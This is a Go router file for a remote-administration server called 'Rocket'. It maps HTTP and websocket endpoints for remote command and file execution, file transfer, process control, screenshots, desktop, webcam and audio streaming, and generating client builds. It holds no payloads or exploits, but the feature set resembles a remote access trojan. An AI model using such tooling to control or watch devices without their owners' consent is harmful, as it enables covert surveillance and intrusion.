package handler

import (
	"Rocket/server/handler/audio"
	authHandler "Rocket/server/handler/auth"
	"Rocket/server/handler/bridge"
	"Rocket/server/handler/desktop"
	"Rocket/server/handler/file"
	"Rocket/server/handler/generate"
	"Rocket/server/handler/longpoll"
	"Rocket/server/handler/process"
	"Rocket/server/handler/screenshot"
	"Rocket/server/handler/share"
	"Rocket/server/handler/terminal"
	"Rocket/server/handler/utility"
	"Rocket/server/handler/webcam"
	"Rocket/server/handler/webrtc"
	"github.com/gin-gonic/gin"
)

var AuthHandler gin.HandlerFunc

// InitRouter will initialize http and websocket routers.
func InitRouter(ctx *gin.RouterGroup) {
	// Public authentication endpoints (no auth required)
	ctx.POST(`/auth/login`, authHandler.Login)
	ctx.POST(`/auth/logout`, authHandler.Logout)
	ctx.GET(`/auth/setup/check`, authHandler.CheckSetup)
	ctx.POST(`/auth/setup`, authHandler.InitialSetup)

	ctx.Any(`/bridge/push`, bridge.BridgePush)
	ctx.Any(`/bridge/pull`, bridge.BridgePull)
	ctx.Any(`/client/update`, utility.CheckUpdate) // Client, for update.

	// Public guest access endpoints (no auth required)
	ctx.GET(`/share/validate`, share.ValidateShareToken)
	ctx.GET(`/share/ice`, share.GetGuestICEConfig)
	ctx.Any(`/share/desktop`, share.InitGuestDesktop)

	group := ctx.Group(`/`, AuthHandler)
	{
		// User management endpoints (auth required)
		group.GET(`/auth/user`, authHandler.GetCurrentUser)
		group.POST(`/auth/password/change`, authHandler.ChangePassword)

		group.POST(`/device/screenshot/get`, screenshot.GetScreenshot)
		group.POST(`/device/process/list`, process.ListDeviceProcesses)
		group.POST(`/device/process/kill`, process.KillDeviceProcess)
		group.POST(`/device/file/remove`, file.RemoveDeviceFiles)
		group.POST(`/device/file/upload`, file.UploadToDevice)
		group.POST(`/device/file/list`, file.ListDeviceFiles)
		group.POST(`/device/file/text`, file.GetDeviceTextFile)
		group.POST(`/device/file/get`, file.GetDeviceFiles)
		group.POST(`/device/file/exec`, file.ExecDeviceFile)
		group.POST(`/device/exec`, utility.ExecDeviceCmd)
		group.POST(`/device/list`, utility.GetDevices)
		group.POST(`/device/:act`, utility.CallDevice)
		group.POST(`/client/check`, generate.CheckClient)
		group.POST(`/client/generate`, generate.GenerateClient)
		group.Any(`/device/terminal`, terminal.InitTerminal)
		group.Any(`/device/desktop`, desktop.InitDesktop)
		group.Any(`/device/webcam`, webcam.InitWebcam)
		group.Any(`/device/audio`, audio.InitAudio)
		group.POST(`/device/webrtc/offer`, webrtc.Offer)
		group.POST(`/device/webrtc/answer`, webrtc.Answer)
		group.POST(`/device/webrtc/ice`, webrtc.ICE)
		group.GET(`/device/webrtc/config`, webrtc.Config)

		// Share management endpoints (auth required)
		group.POST(`/share/create`, share.CreateShare)
		group.GET(`/share/list`, share.ListShares)
		group.GET(`/share/:id`, share.GetShare)
		group.GET(`/share/:id/token`, share.GetShareToken)
		group.GET(`/share/:id/access-log`, share.GetShareAccessLog)
		group.POST(`/share/revoke`, share.RevokeShare)
		group.POST(`/share/delete`, share.DeleteShare)
	}
}

// InitLongPollingRoutes initializes long polling routes
func InitLongPollingRoutes(ctx *gin.RouterGroup) {
	// Long polling routes (no auth required - uses secret-based auth in handlers)
	ctx.POST(`/longpoll/handshake`, longpoll.Handshake)
	ctx.GET(`/longpoll/poll`, longpoll.Poll)
	ctx.POST(`/longpoll/send`, longpoll.Send)
}
